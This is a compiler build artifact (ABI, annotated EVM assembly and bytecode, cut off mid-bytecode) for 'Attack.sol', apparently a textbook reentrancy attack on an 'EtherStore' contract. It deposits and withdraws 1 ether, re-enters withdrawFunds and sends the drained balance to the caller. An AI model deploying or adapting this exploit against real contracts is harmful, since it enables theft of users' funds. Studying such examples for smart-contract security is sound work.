{
	"contract/Attack.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_etherStoreAddress",
							"type": "address"
						}
					],
					"stateMutability": "payable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "balance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "collectEther",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "etherStore",
					"outputs": [
						{
							"internalType": "contract EtherStore",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "pwnEtherStore",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "recieve",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contract/Attack.sol\":91:1070  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"contract/Attack.sol\":242:398  constructor(address _etherStoreAddress) payable{... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"contract/Attack.sol\":330:348  _etherStoreAddress */\n  dup1\n    /* \"contract/Attack.sol\":298:308  etherStore */\n  0x00\n  dup1\n    /* \"contract/Attack.sol\":298:350  etherStore = EtherStore(payable(_etherStoreAddress)) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/Attack.sol\":371:392  address(this).balance */\n  selfbalance\n    /* \"contract/Attack.sol\":361:368  balance */\n  0x01\n    /* \"contract/Attack.sol\":361:392  balance = address(this).balance */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contract/Attack.sol\":242:398  constructor(address _etherStoreAddress) payable{... */\n  pop\n    /* \"contract/Attack.sol\":91:1070  contract Attack {... */\n  jump(tag_5)\n    /* \"#utility.yul\":88:205   */\ntag_7:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_9:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_10:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_19\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_9\n  jump\t// in\ntag_19:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_11:\n    /* \"#utility.yul\":641:665   */\n  tag_21\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_22\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_22:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_12:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_24\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_11\n  jump\t// in\ntag_24:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_2:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_26\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_27\n  tag_7\n  jump\t// in\ntag_27:\n    /* \"#utility.yul\":932:1051   */\ntag_26:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_28\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_12\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contract/Attack.sol\":91:1070  contract Attack {... */\ntag_5:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/Attack.sol\":91:1070  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6289d385\n      eq\n      tag_2\n      jumpi\n      dup1\n      0xa9e10bf2\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xacd2e6e5\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xb69ef8a8\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xff11e1db\n      eq\n      tag_6\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"contract/Attack.sol\":406:724  function pwnEtherStore() public payable {... */\n    tag_2:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      stop\n        /* \"contract/Attack.sol\":889:1067  function recieve() payable external {... */\n    tag_3:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contract/Attack.sol\":112:140  EtherStore public etherStore */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_11\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_11:\n      pop\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/Attack.sol\":147:169  uint256 public balance */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/Attack.sol\":732:829  function collectEther() public {... */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_21\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_21:\n      pop\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n      stop\n        /* \"contract/Attack.sol\":406:724  function pwnEtherStore() public payable {... */\n    tag_8:\n        /* \"contract/Attack.sol\":514:521  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contract/Attack.sol\":501:510  msg.value */\n      callvalue\n        /* \"contract/Attack.sol\":501:521  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"contract/Attack.sol\":493:522  require(msg.value >= 1 ether) */\n      tag_25\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n        /* \"contract/Attack.sol\":581:591  etherStore */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/Attack.sol\":581:604  etherStore.depositFunds */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xe2c41dbc\n        /* \"contract/Attack.sol\":611:618  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contract/Attack.sol\":581:621  etherStore.depositFunds{value:1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_26\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_26:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_28\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_28:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/Attack.sol\":641:650  msg.value */\n      callvalue\n        /* \"contract/Attack.sol\":630:637  balance */\n      0x01\n      0x00\n        /* \"contract/Attack.sol\":630:650  balance -= msg.value */\n      dup3\n      dup3\n      sload\n      tag_29\n      swap2\n      swap1\n      tag_30\n      jump\t// in\n    tag_29:\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contract/Attack.sol\":685:695  etherStore */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/Attack.sol\":685:709  etherStore.withdrawFunds */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x155dd5ee\n        /* \"contract/Attack.sol\":710:717  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contract/Attack.sol\":685:718  etherStore.withdrawFunds(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_31\n      swap2\n      swap1\n      tag_32\n      jump\t// in\n    tag_31:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_33\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_33:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_35\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_35:\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/Attack.sol\":406:724  function pwnEtherStore() public payable {... */\n      jump\t// out\n        /* \"contract/Attack.sol\":889:1067  function recieve() payable external {... */\n    tag_10:\n        /* \"contract/Attack.sol\":968:975  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contract/Attack.sol\":946:956  etherStore */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/Attack.sol\":938:965  address(etherStore).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contract/Attack.sol\":938:975  address(etherStore).balance > 1 ether */\n      gt\n        /* \"contract/Attack.sol\":934:1033  if (address(etherStore).balance > 1 ether) {... */\n      iszero\n      tag_37\n      jumpi\n        /* \"contract/Attack.sol\":990:1000  etherStore */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/Attack.sol\":990:1014  etherStore.withdrawFunds */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x155dd5ee\n        /* \"contract/Attack.sol\":1015:1022  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contract/Attack.sol\":990:1023  etherStore.withdrawFunds(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_38\n      swap2\n      swap1\n      tag_32\n      jump\t// in\n    tag_38:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_39\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_39:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_41\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_41:\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/Attack.sol\":934:1033  if (address(etherStore).balance > 1 ether) {... */\n    tag_37:\n        /* \"contract/Attack.sol\":1052:1061  msg.value */\n      callvalue\n        /* \"contract/Attack.sol\":1041:1048  balance */\n      0x01\n      0x00\n        /* \"contract/Attack.sol\":1041:1061  balance += msg.value */\n      dup3\n      dup3\n      sload\n      tag_42\n      swap2\n      swap1\n      tag_43\n      jump\t// in\n    tag_42:\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contract/Attack.sol\":889:1067  function recieve() payable external {... */\n      jump\t// out\n        /* \"contract/Attack.sol\":112:140  EtherStore public etherStore */\n    tag_13:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contract/Attack.sol\":147:169  uint256 public balance */\n    tag_18:\n      sload(0x01)\n      dup2\n      jump\t// out\n        /* \"contract/Attack.sol\":732:829  function collectEther() public {... */\n    tag_23:\n        /* \"contract/Attack.sol\":780:790  msg.sender */\n      caller\n        /* \"contract/Attack.sol\":772:800  payable(msg.sender).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/Attack.sol\":772:823  payable(msg.sender).transfer(address(this).balance) */\n      0x08fc\n        /* \"contract/Attack.sol\":801:822  address(this).balance */\n      selfbalance\n        /* \"contract/Attack.sol\":772:823  payable(msg.sender).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_46\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_46:\n      pop\n        /* \"contract/Attack.sol\":732:829  function collectEther() public {... */\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_47:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_48:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_49:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_63\n        /* \"#utility.yul\":306:340   */\n      tag_64\n        /* \"#utility.yul\":315:339   */\n      tag_65\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_47\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":306:340   */\n      tag_48\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":288:341   */\n      tag_47\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:487   */\n    tag_50:\n        /* \"#utility.yul\":411:420   */\n      0x00\n        /* \"#utility.yul\":444:481   */\n      tag_67\n        /* \"#utility.yul\":475:480   */\n      dup3\n        /* \"#utility.yul\":444:481   */\n      tag_49\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":431:481   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:487   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":493:653   */\n    tag_51:\n        /* \"#utility.yul\":569:578   */\n      0x00\n        /* \"#utility.yul\":602:647   */\n      tag_69\n        /* \"#utility.yul\":641:646   */\n      dup3\n        /* \"#utility.yul\":602:647   */\n      tag_50\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":589:647   */\n      swap1\n      pop\n        /* \"#utility.yul\":493:653   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":659:842   */\n    tag_52:\n        /* \"#utility.yul\":772:835   */\n      tag_71\n        /* \"#utility.yul\":829:834   */\n      dup2\n        /* \"#utility.yul\":772:835   */\n      tag_51\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":767:770   */\n      dup3\n        /* \"#utility.yul\":760:836   */\n      mstore\n        /* \"#utility.yul\":659:842   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":848:1122   */\n    tag_15:\n        /* \"#utility.yul\":967:971   */\n      0x00\n        /* \"#utility.yul\":1005:1007   */\n      0x20\n        /* \"#utility.yul\":994:1003   */\n      dup3\n        /* \"#utility.yul\":990:1008   */\n      add\n        /* \"#utility.yul\":982:1008   */\n      swap1\n      pop\n        /* \"#utility.yul\":1018:1115   */\n      tag_73\n        /* \"#utility.yul\":1112:1113   */\n      0x00\n        /* \"#utility.yul\":1101:1110   */\n      dup4\n        /* \"#utility.yul\":1097:1114   */\n      add\n        /* \"#utility.yul\":1088:1094   */\n      dup5\n        /* \"#utility.yul\":1018:1115   */\n      tag_52\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":848:1122   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1128:1205   */\n    tag_53:\n        /* \"#utility.yul\":1165:1172   */\n      0x00\n        /* \"#utility.yul\":1194:1199   */\n      dup2\n        /* \"#utility.yul\":1183:1199   */\n      swap1\n      pop\n        /* \"#utility.yul\":1128:1205   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1211:1329   */\n    tag_54:\n        /* \"#utility.yul\":1298:1322   */\n      tag_76\n        /* \"#utility.yul\":1316:1321   */\n      dup2\n        /* \"#utility.yul\":1298:1322   */\n      tag_53\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":1293:1296   */\n      dup3\n        /* \"#utility.yul\":1286:1323   */\n      mstore\n        /* \"#utility.yul\":1211:1329   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1335:1557   */\n    tag_20:\n        /* \"#utility.yul\":1428:1432   */\n      0x00\n        /* \"#utility.yul\":1466:1468   */\n      0x20\n        /* \"#utility.yul\":1455:1464   */\n      dup3\n        /* \"#utility.yul\":1451:1469   */\n      add\n        /* \"#utility.yul\":1443:1469   */\n      swap1\n      pop\n        /* \"#utility.yul\":1479:1550   */\n      tag_78\n        /* \"#utility.yul\":1547:1548   */\n      0x00\n        /* \"#utility.yul\":1536:1545   */\n      dup4\n        /* \"#utility.yul\":1532:1549   */\n      add\n        /* \"#utility.yul\":1523:1529   */\n      dup5\n        /* \"#utility.yul\":1479:1550   */\n      tag_54\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":1335:1557   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1563:1743   */\n    tag_55:\n        /* \"#utility.yul\":1611:1688   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1608:1609   */\n      0x00\n        /* \"#utility.yul\":1601:1689   */\n      mstore\n        /* \"#utility.yul\":1708:1712   */\n      0x11\n        /* \"#utility.yul\":1705:1706   */\n      0x04\n        /* \"#utility.yul\":1698:1713   */\n      mstore\n        /* \"#utility.yul\":1732:1736   */\n      0x24\n        /* \"#utility.yul\":1729:1730   */\n      0x00\n        /* \"#utility.yul\":1722:1737   */\n      revert\n        /* \"#utility.yul\":1749:1943   */\n    tag_30:\n        /* \"#utility.yul\":1789:1793   */\n      0x00\n        /* \"#utility.yul\":1809:1829   */\n      tag_81\n        /* \"#utility.yul\":1827:1828   */\n      dup3\n        /* \"#utility.yul\":1809:1829   */\n      tag_53\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":1804:1829   */\n      swap2\n      pop\n        /* \"#utility.yul\":1843:1863   */\n      tag_82\n        /* \"#utility.yul\":1861:1862   */\n      dup4\n        /* \"#utility.yul\":1843:1863   */\n      tag_53\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":1838:1863   */\n      swap3\n      pop\n        /* \"#utility.yul\":1887:1888   */\n      dup3\n        /* \"#utility.yul\":1884:1885   */\n      dup3\n        /* \"#utility.yul\":1880:1889   */\n      sub\n        /* \"#utility.yul\":1872:1889   */\n      swap1\n      pop\n        /* \"#utility.yul\":1911:1912   */\n      dup2\n        /* \"#utility.yul\":1905:1909   */\n      dup2\n        /* \"#utility.yul\":1902:1913   */\n      gt\n        /* \"#utility.yul\":1899:1936   */\n      iszero\n      tag_83\n      jumpi\n        /* \"#utility.yul\":1916:1934   */\n      tag_84\n      tag_55\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":1899:1936   */\n    tag_83:\n        /* \"#utility.yul\":1749:1943   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1949:2052   */\n    tag_56:\n        /* \"#utility.yul\":2012:2019   */\n      0x00\n        /* \"#utility.yul\":2041:2046   */\n      dup2\n        /* \"#utility.yul\":2030:2046   */\n      swap1\n      pop\n        /* \"#utility.yul\":1949:2052   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2058:2252   */\n    tag_57:\n        /* \"#utility.yul\":2134:2143   */\n      0x00\n        /* \"#utility.yul\":2167:2246   */\n      tag_87\n        /* \"#utility.yul\":2185:2245   */\n      tag_88\n        /* \"#utility.yul\":2194:2244   */\n      tag_89\n        /* \"#utility.yul\":2238:2243   */\n      dup5\n        /* \"#utility.yul\":2194:2244   */\n      tag_56\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":2185:2245   */\n      tag_48\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":2167:2246   */\n      tag_53\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":2154:2246   */\n      swap1\n      pop\n        /* \"#utility.yul\":2058:2252   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2258:2441   */\n    tag_58:\n        /* \"#utility.yul\":2371:2434   */\n      tag_91\n        /* \"#utility.yul\":2428:2433   */\n      dup2\n        /* \"#utility.yul\":2371:2434   */\n      tag_57\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":2366:2369   */\n      dup3\n        /* \"#utility.yul\":2359:2435   */\n      mstore\n        /* \"#utility.yul\":2258:2441   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2447:2721   */\n    tag_32:\n        /* \"#utility.yul\":2566:2570   */\n      0x00\n        /* \"#utility.yul\":2604:2606   */\n      0x20\n        /* \"#utility.yul\":2593:2602   */\n      dup3\n        /* \"#utility.yul\":2589:2607   */\n      add\n        /* \"#utility.yul\":2581:2607   */\n      swap1\n      pop\n        /* \"#utility.yul\":2617:2714   */\n      tag_93\n        /* \"#utility.yul\":2711:2712   */\n      0x00\n        /* \"#utility.yul\":2700:2709   */\n      dup4\n        /* \"#utility.yul\":2696:2713   */\n      add\n        /* \"#utility.yul\":2687:2693   */\n      dup5\n        /* \"#utility.yul\":2617:2714   */\n      tag_58\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":2447:2721   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2727:2918   */\n    tag_43:\n        /* \"#utility.yul\":2767:2770   */\n      0x00\n        /* \"#utility.yul\":2786:2806   */\n      tag_95\n        /* \"#utility.yul\":2804:2805   */\n      dup3\n        /* \"#utility.yul\":2786:2806   */\n      tag_53\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":2781:2806   */\n      swap2\n      pop\n        /* \"#utility.yul\":2820:2840   */\n      tag_96\n        /* \"#utility.yul\":2838:2839   */\n      dup4\n        /* \"#utility.yul\":2820:2840   */\n      tag_53\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":2815:2840   */\n      swap3\n      pop\n        /* \"#utility.yul\":2863:2864   */\n      dup3\n        /* \"#utility.yul\":2860:2861   */\n      dup3\n        /* \"#utility.yul\":2856:2865   */\n      add\n        /* \"#utility.yul\":2849:2865   */\n      swap1\n      pop\n        /* \"#utility.yul\":2884:2887   */\n      dup1\n        /* \"#utility.yul\":2881:2882   */\n      dup3\n        /* \"#utility.yul\":2878:2888   */\n      gt\n        /* \"#utility.yul\":2875:2911   */\n      iszero\n      tag_97\n      jumpi\n        /* \"#utility.yul\":2891:2909   */\n      tag_98\n      tag_55\n      jump\t// in\n    tag_98:\n        /* \"#utility.yul\":2875:2911   */\n    tag_97:\n        /* \"#utility.yul\":2727:2918   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220605fb530670fd421458decabf3c1dd2bac239e69a90d1c63e5c69ebe13411c5764736f6c634300081a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405260405161064d38038061064d833981810160405281019061002591906100cf565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555047600181905550506100fa565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61009e82610075565b9050919050565b6100ae81610094565b81146100b8575f80fd5b50565b5f815190506100c9816100a5565b92915050565b5f602082840312156100e4576100e3610071565b5b5f6100f1848285016100bb565b91505092915050565b610546806101075f395ff3fe608060405260043610610049575f3560e01c80636289d3851461004d578063a9e10bf214610057578063acd2e6e514610061578063b69ef8a81461008b578063ff11e1db146100b5575b5f80fd5b6100556100cb565b005b61005f61020a565b005b34801561006c575f80fd5b506100756102f8565b60405161008291906103e1565b60405180910390f35b348015610096575f80fd5b5061009f61031b565b6040516100ac9190610412565b60405180910390f35b3480156100c0575f80fd5b506100c9610321565b005b670de0b6b3a76400003410156100df575f80fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e2c41dbc670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b15801561014c575f80fd5b505af115801561015e573d5f803e3d5ffd5b50505050503460015f8282546101749190610458565b925050819055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b81526004016101db91906104c4565b5f604051808303815f87803b1580156101f2575f80fd5b505af1158015610204573d5f803e3d5ffd5b50505050565b670de0b6b3a76400005f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156102de575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b81526004016102b091906104c4565b5f604051808303815f87803b1580156102c7575f80fd5b505af11580156102d9573d5f803e3d5ffd5b505050505b3460015f8282546102ef91906104dd565b92505081905550565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b3373ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f19350505050158015610364573d5f803e3d5ffd5b50565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f6103a96103a461039f84610367565b610386565b610367565b9050919050565b5f6103ba8261038f565b9050919050565b5f6103cb826103b0565b9050919050565b6103db816103c1565b82525050565b5f6020820190506103f45f8301846103d2565b92915050565b5f819050919050565b61040c816103fa565b82525050565b5f6020820190506104255f830184610403565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610462826103fa565b915061046d836103fa565b92508282039050818111156104855761048461042b565b5b92915050565b5f819050919050565b5f6104ae6104a96104a48461048b565b610386565b6103fa565b9050919050565b6104be81610494565b82525050565b5f6020820190506104d75f8301846104b5565b92915050565b5f6104e7826103fa565b91506104f2836103fa565b